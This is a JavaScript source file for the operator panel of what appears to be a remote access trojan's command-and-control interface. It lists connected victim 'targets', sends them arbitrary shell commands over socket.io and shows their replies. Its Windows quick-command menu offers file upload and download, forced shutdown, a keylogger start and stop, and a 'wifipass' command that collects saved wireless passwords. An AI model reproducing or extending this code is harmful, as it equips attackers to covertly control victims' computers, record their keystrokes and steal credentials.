//variables
let target_os = ""
let newUserObj = {}
let logs =""
//socket io
const socket = io();

//userSettings variable
let allowNotification = true;
let allowSound=true;

//initilizations

//automatically add targets
requestTargetList()
//automatically joinn room
joinRoom()

//join room
function joinRoom() {
    const currentTimestamp = new Date().getTime();
    const currentDate = new Date(currentTimestamp);
    socket.emit('joinRoom', {"user":false,"os":"web","time":currentDate,"data":{}});
  }

//topmenu
const settings          = document.getElementById("settings");
//set nickname
const nickNameInput     = document.getElementById("newTargetNicknameInput");
const setNicknameButton = document.getElementById("newTargetSetNicknameButton");
//selector
const targetSelector    = document.getElementById("targetSelector");
const refreshButton     = document.getElementById("refreshButton");
const selectedUserText  = document.getElementById("selectedUserText");
const pingButton        = document.getElementById("pingButton");
const pingSpinnner      = document.getElementById("pingSpinner");
const pingStatusHeading = document.getElementById("pingStatusHeading");
const pingStatusDetail  = document.getElementById("pingStatusDetail");
//quick option selector
const quickOptionselector = document.getElementById("quickOptionSelector");
//output textarea
const output            = document.getElementById("exampleFormControlTextarea1");
//shellinput 
const shellInput        = document.getElementById("shellInput");
//send button
const sendButton        = document.getElementById("sendShellInput");
//clear input
const clearButton       = document.getElementById("clearShellInput");
//clear output
const clearOutputButton = document.getElementById("OutputclearButton");
//notification sound
const notificationSOund = document.getElementById("notificationSound");
//log collapse
const logCollapseBody = document.getElementById("logCollapseBody");
//file upload button
const uploadFileButton = document.getElementById("uploadFileButton");
uploadFileButton.style.display="none";

//settings toggle buttons
const toggleButtonNotification = document.getElementById("toggleButtonNotification");
const toggleButtonSound = document.getElementById("toggleButtonSound");
//selector listener
refreshButton.addEventListener("click",()=>{
    requestTargetList();
  })

//request targets list to server
function requestTargetList(){
    socket.emit('getTarget',{});
}
//get targets list from server
socket.on("targets",(targets)=>{
    
    targetSelector.innerHTML=""

    //adding a none option to selector
    const noneOption = document.createElement('option');
    noneOption.textContent = "NONE";
    targetSelector.add(noneOption);

    //adding targets list to selector
    for (const target of targets){
        const option = document.createElement('option');
        option.textContent = target.nickname;
        option.value = target.id;
        targetSelector.add(option);
    }
});

//change target selector value (on selecting a target)
targetSelector.addEventListener('change',()=>{
    selected_target = targetSelector.value;
    selectedUserText.innerHTML = selected_target;
    pingSpinnner.style.display="none";
    if(selected_target !== "NONE"){
        getTargetDetails(selected_target);
    }
});

//request ping 
pingButton.addEventListener('click',()=>{
    if(targetSelector.value !="NONE"){
        pingSpinnner.style.display="block";
        socket.emit("ping",{"target":targetSelector.value})
    }
});

//ping result
socket.on("ping",(data)=>{
    pingSpinnner.style.display="none"
    // Show the modal using jQuery
    $('#pingStatusHeading').text("ALive :)")
    $('#pingStatusDetail').text(`User [${selectedUserText.innerHTML}] ${data.target}  is  Alive`)
    $('#pingStatusModal').modal('show');
});

//new connection modal
socket.on("newcon",(data)=>{
    console.log(data.userObj);
    newUserObj = data.userObj;
    if(allowNotification==true){
    $('#newUserConnectionID').text(data.userObj.id)
    $('#newUserConnectionOS').text(data.userObj.os)
    $('#NewTargetAdmin').text(data.userObj.admin)
    $('#NewTargetime').text(data.userObj.joined)
    if(data.userObj.admin==true){
        newTargetNicknameInput.disabled = true
    }else{newTargetNicknameInput.disabled=false}
    $('#newUserConnection').modal("show")
    date = new Date();
    currentDateAndtime =`${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}` 
    logText = `<span class="logContent">${data.userObj.id} - ${data.userObj.os}[ <span style="color: yellow;">${(data.userObj.admin)?"ADMIN":"TARGET"}</span> ] <span style="color: yellowgreen;">Connected</span> @ ${currentDateAndtime}</span>`
    logs = logs+logText;
    logCollapseBody.innerHTML = logs;
}
    
    requestTargetList()
    if(allowSound==true){
        notificationSOund.play().catch(error => {
           alert(error)
          });
    }
});

//on disconnection of  a client
socket.on("discon",(data)=>{
    requestTargetList()
    date = new Date();
    currentDateAndtime =`${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}` 
    logText = `<span class="logContent">${data.target} <span style="color: #C70039 ;">Disconnected</span> @ ${currentDateAndtime}</span>`
    console.log("a client disconnected")
    logs = logs+logText;
    logCollapseBody.innerHTML = logs;
    
})

//get target details
function getTargetDetails(target){
    console.log('running function')
    socket.emit("targetDetails",{"target":target})
}

//receive target details
socket.on("targetDetail",(data)=>{
    console.log('received something!')
    console.log(data)
    details = data[0];
    detailText =`
    OS          : ${details.os}<br>
    Time        : ${details.joined}<br>
    NICKNAME    : ${details.nickname}<br>
    ADMIN       : ${details.admin}<br>
    `

    
    //set os detail globally (for quick option selector)
    if((details.os).toLowerCase().includes("windows")){
        target_os = "windows"
    }else if((details.os).toLowerCase().includes("android")){
        target_os = "android"
    }else if((details.os).toLowerCase().includes("web")){
        target_os = "web"
    }else{
        target_os = "unknown"
    }
    otherDetails = Object.entries(details.userdata).map(([key,value])=>`${key} : ${value}<br>`)
    finalDetailText = detailText+otherDetails;
    $('#targetDetails').html(finalDetailText)
    if(target_os === "windows"){
        for(const option of windowsJsonCommands){
            const quickOption = document.createElement("option");
            quickOption.textContent = option.text;
            quickOption.value = option.cmd;
            quickOptionselector.appendChild(quickOption)
        }
    }
    
});

//top menu
settings.addEventListener('click',()=>{
    console.log(newUserObj)
    console.log(windowsJsonCommands)
})

//set nickname
newTargetSetNicknameButton.addEventListener('click',()=>{
    id = newUserObj.id
    nickname = nickNameInput.value
    console.log(`id : ${id} new nickname : ${nickname} nickname is ${nickname===""} nickname is ${nickname===null}`)
    if(nickname!==""){
        socket.emit('changeNickname',{"nickname":nickname,"id":id})
    }
    
});

//change target nickname confirmation msg (closes if success)
socket.on('success',()=>{
    console.log("successfully changed nickname")
    newTargetNicknameInput.value =""
    $("#newUserConnection").modal('hide')
    requestTargetList()
});

//load quickoption json
function getWindownQuickCommands(){
    fetch("windows.json".then(response=>response.json()).then(data=>{
        console.log(data)
    }))
}

//get quick option command
quickOptionselector.addEventListener('change',()=>{
    selectedOption = quickOptionselector.value;
    if(selectedOption!="None"){
        shellInput.value =selectedOption;
    }
    if(selectedOption.includes("upload")){
        uploadFileButton.style.display="";
    }
    else{
        uploadFileButton.style.display="none";
    }
});

//clear input 
clearButton.addEventListener('click',()=>{
    shellInput.value =""
});

//clear output
clearOutputButton.addEventListener('click',()=>{
    output.value=""
})


//send button shellinput
sendButton.addEventListener("click",()=>{
    value = output.value
    if(shellInput.value !=""){
      selected_target =  selectedUserText.innerHTML;
      output.value = value +`\n\n(${selected_target}) [YOU] >> ${shellInput.value}`
      socket.emit('runcmd',{"target":selected_target,"cmd":shellInput.value})
    shellInput.value = ""
    output.scrollTop = output.scrollHeight;
    }
    
  });

//reply from target (through server)
socket.on('reply',(data)=>{
    from = data.from
    result = data.result
    value = output.value
    output.value = value +`\n\n(${from}) [REPLY] >> ${result}`
    output.scrollTop = output.scrollHeight;
    
});


//settings menu toggle button functions

//toggle notification
toggleButtonNotification.addEventListener('click',()=>{
    console.log('clicked')
    allowNotification=!allowNotification;
    if(allowNotification===true){
        toggleButtonNotification.style.color ="yellowgreen"
        toggleButtonNotification.innerHTML = "toggle_on"
    }else{
        toggleButtonNotification.style.color ="grey"
        toggleButtonNotification.innerHTML = "toggle_off"
    }
});

//toggle sound
toggleButtonSound.addEventListener('click',()=>{
    console.log('clicked')
    allowSound=!allowSound;
    if(allowSound===true){
        toggleButtonSound.style.color ="yellowgreen"
        toggleButtonSound.innerHTML = "toggle_on"
    }else{
        toggleButtonSound.style.color ="grey"
        toggleButtonSound.innerHTML = "toggle_off"
    }
});


//windows command json
const windowsJsonCommands=[
    {"text":"download a file","cmd":"download \"filename\"","desc":"downloads a file from remote device"},
    {"text":"upload a file","cmd":"upload \"filename\"","desc":"uploads a filte to remote device"},
    {"text":"shutdown","cmd":"shutdown","desc":"poweroff remote device"},
    {"text":"reboot","cmd":"reboot","desc":"restarts remote device"},
    {"text":"shutdown with message","cmd":"shutdown_m \"message\"","desc":" shutdown remote device after showing a message"},
    {"text":"shutdown with timer","cmd":"shutdown_t \"timer\"","desc":" shutdown remote device after specific time"},
    {"text":"start keylogger","cmd":"keylogger_start","desc":"gets keystrikes on remote devices"},
    {"text":"stop keylogger","cmd":"keylogger_stop","desc":"stops the running keylogger"},
    {"text":"wifi passwords","cmd":"wifipass","desc":"collects all saved wireless networjk passwords"}
]
